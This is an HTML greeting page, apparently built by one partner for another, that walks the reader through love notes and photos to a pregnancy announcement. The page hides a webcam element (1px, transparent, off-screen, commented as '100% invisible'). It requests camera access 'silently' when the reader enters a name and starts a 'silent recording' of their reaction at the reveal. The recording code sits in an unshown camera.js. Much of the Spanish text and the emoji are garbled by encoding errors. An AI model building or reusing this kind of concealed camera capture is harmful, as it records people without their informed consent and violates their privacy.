<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>5 AÃ±os Contigo ğŸ’—</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400;1,700&family=Dancing+Script:wght@600;700&family=Lato:wght@300;400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>

    <!-- Confetti canvas (fondo, sin interacciÃ³n) -->
    <canvas id="confetti-canvas" style="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:999;"></canvas>

    <!-- Floaters y glow de fondo -->
    <div class="floaters" id="floaters"></div>
    <div class="glow" aria-hidden="true"></div>

    <!-- Audio -->
    <audio id="bg-music"     preload="auto"><source src="assets/fondo.mp3"  type="audio/mpeg"></audio>
    <audio id="latido-audio" preload="auto"><source src="assets/latido.mp3" type="audio/mpeg"></audio>

    <!-- CÃ¡mara 100% invisible â€” sin ningÃºn elemento visible -->
    <video  id="cam-video"  autoplay playsinline muted
            style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px;"></video>
    <canvas id="cam-canvas" style="display:none;"></canvas>

    <!-- â•â• CARD â•â• -->
    <div class="card" id="card">
        <span class="corner-ornament tl" aria-hidden="true">ğŸŒ¸</span>
        <span class="corner-ornament tr" aria-hidden="true">ğŸŒ·</span>
        <span class="corner-ornament bl" aria-hidden="true">ğŸŒº</span>
        <span class="corner-ornament br" aria-hidden="true">ğŸ’</span>

        <!-- PASO 1: Login -->
        <section id="step-login" class="step active" aria-label="Bienvenida">
            <p class="eyebrow su1">para ti Â· con todo mi amor</p>
            <h1 class="big-title su1">Amor MÃ­o</h1>
            <p class="tagline su2">cinco aÃ±os escribiendo nuestra historiaâ€¦</p>
            <div class="divider su2">
                <div class="divider-line"></div>
                <span class="divider-icon" aria-hidden="true">ğŸŒ¹</span>
                <div class="divider-line"></div>
            </div>
            <p class="intro-text su2">
                He guardado algo muy especial para este dÃ­a.<br>
                Escribe tu nombre para abrir este sobre.
            </p>
            <div class="input-wrap su3">
                <input type="text" id="username" placeholder="TU NOMBRE"
                    autocomplete="given-name" autocorrect="off"
                    autocapitalize="words" spellcheck="false">
            </div>
            <div class="su3">
                <button class="btn" onclick="startExperience()">
                    ğŸ’Œ &nbsp;Abrir el sobre
                </button>
            </div>
            <p class="error-msg" id="login-error" role="alert"></p>
        </section>

        <!-- PASO 2: Pistas -->
        <section id="step-hints" class="step" aria-label="Fragmentos de amor">
            <p class="hint-counter" id="hint-counter">FRAGMENTO 1 DE 5</p>
            <div class="hint-inner" id="hint-inner"></div>
            <div class="dots" id="dots"></div>
            <button class="btn" onclick="nextHint()">Seguir leyendo âœ¨</button>
        </section>

        <!-- PASO 3: Pre-reveal -->
        <section id="step-reveal" class="step" aria-label="El momento especial">
            <p class="eyebrow">el momento mÃ¡s importante</p>
            <h2 class="reveal-title">Hay algo que<br>quiero decirteâ€¦</h2>
            <p class="reveal-sub">Ninguna palabra ha sido suficiente.<br>Hasta ahora.</p>
            <button class="btn btn-reveal" onclick="showFinalMessage()">
                ğŸŒ¸ &nbsp;Abrir mi corazÃ³n &nbsp;ğŸŒ¸
            </button>
        </section>

        <!-- PASO 4: Final -->
        <section id="step-final" class="step" aria-label="La gran revelaciÃ³n">
            <div class="final-grid su1">
                <div>
                    <div class="final-badge">âœ¨ 5 aÃ±os Â· y apenas empezamos âœ¨</div>
                    <h1 class="final-headline">Â¡Vamos a ser papÃ¡s!</h1>
                </div>
                <p class="final-sub su2">
                    Porque amarte me enseÃ±Ã³ que el corazÃ³n<br>
                    siempre tiene espacio para amar mÃ¡s. ğŸ’•
                </p>
                <div class="ultrasound-wrap su2">
                    <!--
                        Imagen ecografÃ­a:
                        Local  â†’ src="assets/ecografia.jpg"
                        Drive  â†’ src="https://drive.google.com/thumbnail?id=TU_ID&sz=w1000"
                    -->
                    <img src="https://drive.google.com/thumbnail?id=1l_O4ErVBj6zaD91YuQHuEq1EB8D3jH8h&sz=w1000"
                         alt="Primera ecografÃ­a"
                         class="ultrasound-img" loading="eager">
                    <span class="deco-float tr" aria-hidden="true">ğŸŒ¸</span>
                    <span class="deco-float bl" aria-hidden="true">ğŸ‘¶</span>
                </div>
                <div class="su3" style="display:grid;gap:0.5rem;">
                    <p class="final-names">Kathe &amp; Kevin</p>
                    <p class="final-names small">pronto seremos tres ğŸ¼</p>
                    <p class="final-caption" style="margin-top:0.6rem;">
                        Gracias por elegirme cada dÃ­a, mi amor.<br>
                        Este es el regalo mÃ¡s hermoso de nuestra historia. ğŸ’—
                    </p>
                </div>
            </div>
        </section>
    </div>

    <!-- Scripts -->
    <script src="js/confetti.js"></script>
    <script src="js/camera.js"></script>
    <script>

    /* â”€â”€ FLOATERS â”€â”€ */
    const SYMBOLS = ['ğŸŒ¸','ğŸŒ·','ğŸŒº','ğŸ’','ğŸŒ¹','ğŸŒ¼','ğŸ’—','ğŸ’•','ğŸ’–','ğŸ’','ğŸ’“','âœ¨'];
    const floaterWrap = document.getElementById('floaters');
    function spawnFloater() {
        const el = document.createElement('span');
        el.className = 'floater';
        el.innerText = SYMBOLS[(Math.random() * SYMBOLS.length) | 0];
        el.style.left = Math.random() * 100 + 'vw';
        el.style.fontSize = (1.2 + Math.random() * 2.2) + 'rem';
        const dur = 11 + Math.random() * 14;
        el.style.animationDuration = dur + 's';
        el.style.animationDelay    = (Math.random() * 4) + 's';
        floaterWrap.appendChild(el);
        setTimeout(() => el.remove(), (dur + 7) * 1000);
    }
    for (let i = 0; i < 22; i++) spawnFloater();
    setInterval(spawnFloater, 1800);

    /* â”€â”€ PISTAS â”€â”€ */
    let currentHint = 0;
    const hints = [
        {
            text: "El amor verdadero no se detiene en el tiempoâ€¦ se multiplica de maneras que jamÃ¡s imaginamos.",
            photo: { src: "https://lh3.googleusercontent.com/d/1sP8T-co6JIAHqQVM7w5NyrYUMFEO_Pus", caption: "Tu sonrisa es mi lugar favorito." }
        },
        { text: "Desde el primer dÃ­a supe que contigo, todo iba a ser diferente.", photo: null },
        {
            text: "Cada risa, cada abrazo, cada momento juntos ha sido un capÃ­tulo mÃ¡gico en nuestra historia de amor.",
            photo: { src: "https://lh3.googleusercontent.com/d/14KY4OCBVl3kGQj-bcJYX96aG1lVDC92F", caption: "Por una eternidad de besos." }
        },
        { text: "Gracias por enseÃ±arme que amar es cuidar, respetar y crecer juntos. Eres el sueÃ±o del que nunca quiero despertar.", photo: null },
        {
            text: "Porque la historia mÃ¡s bonita que hemos vivido juntosâ€¦ apenas acaba de comenzar su capÃ­tulo mÃ¡s especial.",
            photo: { src: "https://lh3.googleusercontent.com/d/1zmjJhL-OiMoeJE4LCLJyZ2bn4VlZa3W8", caption: "Donde sea, pero siempre contigo. ğŸ’•" }
        }
    ];

    /* â”€â”€ AUDIO â”€â”€ */
    const bgMusic = document.getElementById('bg-music');
    const latido  = document.getElementById('latido-audio');

    function unlockAudio() {
        try {
            const AC = window.AudioContext || window.webkitAudioContext;
            if (!AC) return;
            const c = new AC();
            const b = c.createBuffer(1,1,22050);
            const s = c.createBufferSource();
            s.buffer = b; s.connect(c.destination); s.start(0);
            c.resume().catch(() => {});
        } catch(e) {}
    }

    function fadeTo(audio, target, ms) {
        const start = audio.volume, diff = target - start;
        const steps = 40, iv = ms / steps;
        let i = 0;
        const t = setInterval(() => {
            i++;
            audio.volume = Math.min(1, Math.max(0, start + diff * (i / steps)));
            if (i >= steps) clearInterval(t);
        }, iv);
    }

    /* â”€â”€ TRANSICIÃ“N DE PASOS â”€â”€ */
    function showStep(fromId, toId) {
        const from = document.getElementById(fromId);
        const to   = document.getElementById(toId);
        from.classList.remove('visible');
        setTimeout(() => {
            from.classList.remove('active');
            to.classList.add('active');
            requestAnimationFrame(() => requestAnimationFrame(() => to.classList.add('visible')));
        }, 560);
    }

    window.addEventListener('load', () => {
        document.getElementById('step-login').classList.add('visible');
    });

    /* â”€â”€ PASO 1 â”€â”€ */
    function startExperience() {
        const name = document.getElementById('username').value.trim();
        const err  = document.getElementById('login-error');
        if (name.length < 2) {
            err.innerText = 'Escribe tu nombre para continuar ğŸŒ¸';
            document.getElementById('username').focus();
            return;
        }
        err.innerText = '';
        unlockAudio();
        bgMusic.loop   = true;
        bgMusic.volume = 0.38;
        bgMusic.play().catch(() => {});
        requestCamPermission();   /* permiso cÃ¡mara â€” silencioso */
        buildDots();
        renderHint(false);
        showStep('step-login', 'step-hints');
    }

    /* â”€â”€ PASO 3 â†’ 4: RevelaciÃ³n â”€â”€ */
    async function showFinalMessage() {
        fadeTo(bgMusic, 0, 1100);
        setTimeout(() => { bgMusic.pause(); bgMusic.currentTime = 0; }, 1100);

        unlockAudio();
        latido.loop   = true;
        latido.volume = 0;
        latido.play().catch(() => {});
        fadeTo(latido, 0.78, 1000);

        document.body.classList.add('final-bg');
        document.getElementById('card').classList.add('revealed', 'expanded');
        showStep('step-reveal', 'step-final');

        launchConfetti();                              /* explosiÃ³n instantÃ¡nea */
        setTimeout(startReactionRecording, 1000);      /* grabaciÃ³n silenciosa */
    }

    /* â”€â”€ PISTAS â”€â”€ */
    function buildDots() {
        const wrap = document.getElementById('dots');
        wrap.innerHTML = '';
        hints.forEach((_, i) => {
            const d = document.createElement('span');
            d.className = 'dot' + (i === 0 ? ' active' : '');
            wrap.appendChild(d);
        });
    }

    function renderHint(animate) {
        const inner = document.getElementById('hint-inner');
        const hint  = hints[currentHint];
        document.getElementById('hint-counter').innerText =
            `FRAGMENTO ${currentHint + 1} DE ${hints.length}`;
        inner.innerHTML = '';

        const textEl = document.createElement('p');
        textEl.className = 'hint-text';
        if (animate) textEl.classList.add('fade-out');
        textEl.innerText = hint.text;
        inner.appendChild(textEl);

        if (hint.photo) {
            const photoEl = document.createElement('div');
            photoEl.className = 'hint-photo';
            photoEl.innerHTML =
                `<img src="${hint.photo.src}" alt="${hint.photo.caption}" loading="lazy">` +
                `<div class="hint-photo-caption">${hint.photo.caption}</div>`;
            inner.appendChild(photoEl);
            requestAnimationFrame(() => requestAnimationFrame(() => {
                textEl.classList.remove('fade-out');
                setTimeout(() => photoEl.classList.add('visible'), 110);
            }));
        } else {
            requestAnimationFrame(() => requestAnimationFrame(() => textEl.classList.remove('fade-out')));
        }
    }

    function nextHint() {
        const textEl  = document.querySelector('#hint-inner .hint-text');
        const photoEl = document.querySelector('#hint-inner .hint-photo');
        if (textEl)  textEl.classList.add('fade-out');
        if (photoEl) { photoEl.classList.remove('visible'); photoEl.style.opacity = '0'; }
        setTimeout(() => {
            currentHint++;
            if (currentHint < hints.length) {
                document.querySelectorAll('.dot').forEach((d, i) =>
                    d.classList.toggle('active', i === currentHint));
                renderHint(true);
            } else {
                showStep('step-hints', 'step-reveal');
            }
        }, 460);
    }

    document.getElementById('username').addEventListener('keydown', e => {
        if (e.key === 'Enter') startExperience();
    });

    </script>
</body>
</html>